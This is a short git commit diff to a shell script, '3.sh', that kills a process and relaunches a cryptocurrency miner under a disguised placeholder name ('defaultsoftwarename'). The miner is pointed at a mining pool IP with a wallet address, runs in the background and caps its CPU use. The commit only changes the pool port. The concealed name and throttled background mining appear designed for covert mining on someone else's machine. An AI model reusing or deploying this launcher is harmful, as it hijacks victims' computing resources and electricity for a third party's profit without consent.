ffce8c9303fd423b2b42abfde58babe716bfe6de
solscobbturpa <57539661+solscobbturpa@users.noreply.github.com>
2020-03-01 16:51:19 +0800

    Update 3.sh

--- 3.sh
+++ 3.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 188.165.224.211:30002 -u 45wui8xTuZFQk7A6pFv8Dka9zsoTSXpwe1Wyx9pRD18SKzRJiCJ5ovXgkkDUiDvBhKJNkiEbCgBUDPHTJZj6KdbLSaCrgc9 --pass=x:solscobbturpa@gmail.com --rig-id=22 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
+defaultsoftwarename -o 188.165.224.211:30006 -u 45wui8xTuZFQk7A6pFv8Dka9zsoTSXpwe1Wyx9pRD18SKzRJiCJ5ovXgkkDUiDvBhKJNkiEbCgBUDPHTJZj6KdbLSaCrgc9 --pass=x:solscobbturpa@gmail.com --rig-id=22 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=83 --av=1
